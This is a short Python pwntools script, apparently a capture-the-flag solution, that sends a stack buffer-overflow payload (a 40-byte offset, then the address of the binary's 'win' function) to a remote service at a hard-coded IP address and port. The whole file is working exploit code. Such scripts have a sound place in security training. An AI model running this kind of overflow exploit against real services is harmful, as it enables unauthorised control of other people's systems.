from pwn import *
from pwn import p64

elf = ELF('flow')
# p = elf.process()
ip = "104.248.97.237"
# p = remote("0.0.0.0", 2001)
p = remote(ip, 1344)
offset = 40
payload = flat({offset: p64(elf.symbols.win)})
p.sendline(payload)
log.info(p.clean())
p.close()
